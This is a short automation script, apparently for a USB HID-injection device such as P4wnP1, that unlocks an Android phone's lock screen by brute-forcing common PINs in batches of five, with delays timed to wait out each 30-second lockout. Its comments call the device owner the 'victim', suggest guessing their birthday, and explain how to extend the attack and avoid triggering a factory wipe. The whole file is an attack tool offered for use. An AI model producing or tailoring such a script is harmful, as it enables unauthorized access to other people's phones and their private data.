//Layout and Stuff
layout("DE");
console.log("Android Pin Unlocker started");
typingSpeed(200,200);
delay(800);

//Getting to the PIN Screen
moveStepped(-2000,300);
console.log("Double click button1");
doubleClick(BT1);
delay(500);
console.log("Moving mouse with button1 pressed");
button(BT1);
moveStepped(3000,0);
button(BTNONE);
moveStepped(-3000,0);
delay(2000);

//Actual PIN typing now (you can edit the numbers to whatever you want, i'd recommend using your victims birthday or year if you know it.)

type("1234\n");
delay(500);
type("1111\n");
delay(500);
type("0000\n");
delay(500);
type("1212\n");
delay(500);
type("1337\n");
delay(33000); //Delay of a bit more then 30seconds, because most Phones lock themselves for 30seconds when 5 PINs were incorrect

 //Getting to the PIN Screen again: Electric Boogaloo
console.log("Doubleclick button1");
doubleClick(BT1);
delay(999);
console.log("Moving mouse with button1 pressed");
button(BT1);
moveStepped(3000,0);
button(BTNONE);
moveStepped(-3000,0);
delay(2000);

//Actual PIN typing again 

type("7777\n");
delay(500);
type("2003\n");
delay(500);
type("2804\n");
delay(500);
type("2905\n");
delay(500);
type("1337\n");
delay(33000); //Same as before

//If you need more then that just copy paste the "Getting to the PIN Screen" here and then the PIN typing. But beware: some Phones might actually wipe themselves or Factoryreset if you try too many PINs. 

//Also beware: Some Phones increase the amount of time they stay locked after the wrong PIN entrys. Some may decrease the amount of wrong PINs needed to lock themselves.
//Research beforehand and edit the delays and amount of PINs accordingly.
